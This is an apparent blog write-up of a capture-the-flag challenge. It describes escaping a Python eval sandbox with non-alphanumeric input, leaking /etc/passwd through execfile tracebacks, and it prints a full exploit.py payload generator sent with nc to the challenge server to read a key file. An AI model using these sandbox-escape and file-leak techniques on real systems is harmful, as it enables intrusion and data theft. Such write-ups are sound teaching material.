<p>The python program consists of two parts:</p>

<ul>
  <li>First part is the Detangle class which basically make a “sandbox” environment:</li>
</ul>

<ol>
  <li>You can not import anything.</li>
  <li>You can neither use “open” nor “file” command.</li>
  <li>It prints some nice debug information about what python command is executed and their arguments.</li>
</ol>

<ul>
  <li>Second part allows you to input 3 params: num1, num2 and operator. There are two regular expressions to check your input:</li>
</ul>

<pre class="brush: plain; title: ; notranslate" title="">num_pattern = re.compile(r'^[d]{0,4}$')
operator_pattern = re.compile(r'^[W]+$')
...
if not num_pattern.match(num1) or not num_pattern.match(num2):
    raise SystemExit('Number rejected')
if not operator_pattern.match(operator) or len(operator) &gt; 1900:
    raise SystemExit('Operator rejected')
</pre>

<ol>
  <li>num1, num2 should only be number, 4 digits at most.</li>
  <li>operator should not contain any alphanumeric characters and its length must be at most 1900.</li>
</ol>

<p>These input will be fed into some eval command as follow:</p>

<pre class="brush: plain; title: ; notranslate" title="">operator = eval(operator) if "'" in operator else operator
print(eval(num1 + operator + num2))
</pre>

<p>For example, you can input “1″ , “2″ , “+”. The program will return “3″, simple as that.</p>

<p>Obviously, if someone tells you to exploit this program, first is to look at “eval” (i.e. “evil”) and try to exploit that. But it’s a difficult task because you can’t bypass the two regular expressions and input any python code, recall that you can only input number or non-alphanumberic character.</p>

<p>I tried several attempts and failed including some silly: trying to write a valid python code using unicode character, trying to overflow eval, trying to exploit Detangle, find a 0-day/1-day of re.match, ..<br />
But failures teach you some lessons. I noticed that “operator” is eval-ed twice. That means after the first eval, we may be able to convert some non-alphanumberic character into python code and get it executed on the next one.</p>

<p>I started with this gadget: s = <code>"(''=='')+(''=='')"</code>(inside are two single quotes). Run eval(s) in a python terminal will return you number “2″. Using this gadget/similar kind we typically can create any number. Progress: 25% !</p>

<p>Now what about character ? It turned out that I can use backstick : ` ` as repr() which can give me some string that contains alpha-character, such as : <code>`(''=='')`</code> =&gt; “True”, <code>`(''!='')`</code> =&gt; “False”, moreover I can access each single character using square bracket : <code>`(''=='')`[1]</code> =&gt; ‘r’, or even better <code>`'xaa'`[3]</code> =&gt; ‘a’. We now can create any of these:** ‘abcdefxTruFls’**. Progress: 50% !</p>

<p>I stopped looking at gadget, and started looking at how to bypass the Detangle class. It’s not hard as it look, though we can’t use “open” or “file” to open a file, can’t import anything, we can still use the built-in <strong>“execfile”</strong>. It does not allow us to run abitrary command but we can leak some info about the content of a file like this:</p>

<blockquote>
  <blockquote>
    <blockquote>
      <blockquote>
        <p>execfile(“/etc/passwd”)<br />
Traceback (most recent call last):<br />
File “”, line 1, in<br />
File “/etc/passwd”, line 1<br />
root:x:0:0:root:/root:/bin/bash  </p>
      </blockquote>
    </blockquote>
  </blockquote>
  <p>SyntaxError: invalid syntax</p>
</blockquote>

<p>Progress: 75% !!!!! ** so excited **</p>

<p>I need to read the file ‘key’ which makes the payload: “<strong>+execfile(‘key’)+</strong>“. As you can see, It contains “k”,”y”,”i” that is not in my “magic” list. Luckily the force is with me, 5 minutes after seeing this problem, I come up with this awesome gadget: <code>"%c"%(107)</code> =&gt; “k”. Any character can be generated using this gadget, however producing the number 107 can consume a lot of characters if done naively.</p>

<p>The last thing is to make the payload as short as possible because the operator length is limited at 1900. Putting everything together, I am able to produce a 1650-bytes payload, far smaller than the limit! Now see how it work:</p>

<blockquote>
  <p>python exploit.py | nc ctf.fluxfingers.net 2060<br />
…<br />
Traceback (most recent call last):<br />
File “./sandbox.py”, line 77, in<br />
print(eval(num1 + operator + num2))<br />
File “./sandbox.py”, line 45, in __call__<br />
result = self.orig(*args, *<em>kwargs)<br />
File “”, line 1, in<br />
File “./sandbox.py”, line 45, in __call__<br />
result = self.orig(*args, *</em>kwargs)<br />
File “key”, line 1, in<br />
dafuq_how_did_you_solve_this_nonalpha_thingy<br />
NameError: name ‘dafuq_how_did_you_solve_this_nonalpha_thingy’ is not defined</p>
</blockquote>

<p>Mission accomplished ! Beer time =]</p>

<p><strong>exploit.py</strong> source code:</p>

<pre class="brush: plain; title: ; notranslate" title="">def makenumsmall(d):
	gadget = "(''=='')"
	rs = gadget

	if (d==0): return rs+"-"+rs
	if (d==1): return rs+"*"+rs

	for i in range(1,d): rs += "+(''=='')"
	return rs

def makenum(d):
	if (d&lt;5): return makenumsmall(d)
	a = bin(d)[2:]
	index = len(a) - 1
	s = ""
	for c in a:
		if c == '1':
			s+= "("+makenumsmall(1)+"&lt;&lt;"+makenumsmall(index)+")+"
		index-=1
	return s[0:-1]

def makechar(line):
	return "('%'+`'"+chr(0xcc)+"'`["+str(makenum(3))+"])["+str(makenum(0))+":"+str(makenum(4))+"]%(" + makenum(line) + ")"

gd = {}

gd['x'] = "`'"+chr(0xcc)+"'`["+makenum(2)+"]"
gd['a'] = "`'"+chr(0xaa)+"'`["+makenum(3)+"]"
gd['b'] = "`'"+chr(0xbb)+"'`["+makenum(3)+"]"
gd['c'] = "`'"+chr(0xcc)+"'`["+makenum(3)+"]"
gd['d'] = "`'"+chr(0xdd)+"'`["+makenum(3)+"]"
gd['e'] = "`'"+chr(0xee)+"'`["+makenum(3)+"]"
gd['f'] = "`'"+chr(0xff)+"'`["+makenum(3)+"]"

a = "+execfile('key')+"
solo = [ord(i) for i in a]
#print solo
_sum = ''
import re
for line in solo:
	if chr(line) in gd:
		_gad = gd[chr(line)]
	elif chr(line) == "'":
		_gad = "'\''"
	elif re.match("W",chr(line)):
		_gad = "'"+chr(line)+"'"
	else:
		_gad = makechar(line)
	_sum += "+" + _gad

_sum = _sum[1:]
#print len(_sum)
#print eval(eval(_sum))
print "1n1n"+_sum
</pre>

  ]]></description>
</item>

</channel>
</rss>